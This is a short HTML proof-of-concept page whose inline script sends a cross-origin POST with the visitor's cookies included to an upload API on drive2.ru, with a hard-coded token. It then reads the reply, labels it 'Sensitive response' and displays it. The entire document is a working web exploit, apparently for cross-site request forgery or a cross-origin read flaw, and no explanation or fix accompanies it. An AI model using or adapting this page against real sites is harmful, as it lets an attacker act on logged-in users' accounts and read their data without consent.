<!DOCTYPE html>
<html>
<body>
<script>
const form = new FormData();

form.append("_", "uploadSimple");
form.append("type", "messengerimage");
form.append(
  "file",
  new Blob(["test"], { type: "image/jpeg" }),
  "poc.jpg"
);

fetch("https://upload-www.drive2.ru/_api/upload?.AMIG=.AMIG&token=AhgCSVVQVAjeuvYUvSOQCjDhAEAADNUKMMjAgABRT5XoNp_Sb3Vkc2Bn3PoAdNJrvma_", {
  method: "POST",
  credentials: "include",
  body: form
})
.then(r => r.text())
.then(data => {
  console.log("Sensitive response:", data);
  document.body.innerHTML = `<pre>${data}</pre>`;
})
.catch(console.error);
</script>
</body>
</html>
